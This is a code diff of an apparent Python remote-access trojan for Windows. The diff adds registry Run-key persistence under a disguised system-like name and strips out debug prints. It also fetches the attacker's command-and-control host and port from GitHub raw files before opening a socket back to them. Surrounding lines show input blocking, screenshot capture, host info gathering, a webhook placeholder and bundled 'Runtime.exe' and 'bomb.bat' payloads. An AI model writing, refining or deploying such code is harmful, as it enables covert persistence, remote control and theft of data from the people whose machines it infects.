@@ -19,16 +19,25 @@ import winreg
 
 WEBHOOK_URL = "&WEBHOOK_URL&"
 
-print("started")
+url  = "https://raw.githubusercontent.com/hackerOrionX/test/main/sator1"
+urlport = "https://raw.githubusercontent.com/hackerOrionX/test/main/number1"
+HOST = '192.168.0.6'
+PORT = 4444
+
+
+
+script_dir = getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__)))
+reverse = os.path.join(script_dir, 'Runtime.exe')
+bomb = os.path.join(script_dir, 'bomb.bat')
 
 script_path = os.path.abspath(sys.argv[0])
 
+#current vs local
 try:
     reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
     reg_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path, 0, winreg.KEY_SET_VALUE)
     winreg.SetValueEx(reg_key, "Sys Application Frame Host", 0, winreg.REG_SZ, script_path)
     winreg.CloseKey(reg_key)
-    print("reg")
 except Exception:
     pass
 
@@ -64,7 +73,6 @@ def aes_decrypt(encrypted_text):
     return decrypted_plaintext.decode()
 
 
-
 def get_ip(url):
     amongus = urllib.request.urlopen(url)
     data = amongus.read().decode('utf-8')
@@ -72,18 +80,11 @@ def get_ip(url):
     return value
 
 def get_port(urlport):
-    amongus = urllib.request.urlopen(urlport)
+    amongus = urllib.request.urlopen(url)
     data = amongus.read().decode('utf-8')
-    value = str(data.strip())  
-    int(value)
+    value = str(data.strip())
     return value
     
-
-
-url = "https://raw.githubusercontent.com/hackerOrionX/test/main/sator"
-urlport = "https://raw.githubusercontent.com/hackerOrionX/test/main/number"
-HOST = '192.168.0.6'
-PORT = 4444
 
 
 def killinput():
@@ -138,7 +139,6 @@ def screen():
     os.remove("screenshot.png")
 
 
-
 def getinfos():
     global systeminfos
     hostname = socket.gethostname()
@@ -148,11 +148,6 @@ def getinfos():
     systeminfos = f"|HOST: {hostname} {ipx}| |OS : {windowsversion} {machine}|"
 
 
-script_dir = getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__)))
-reverse = os.path.join(script_dir, 'Runtime.exe')
-bomb = os.path.join(script_dir, 'bomb.bat')
-
-
 while True:
     connected = False
 
@@ -160,8 +155,8 @@ while True:
         try:
             client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             HOST = get_ip(url)
-            PORT = get_port(urlport)
-            print("connect")
+            STPORT = get_ip(urlport)
+            PORT = int(STPORT)
             client_socket.connect((HOST, PORT))
             getinfos() 
             connected = True
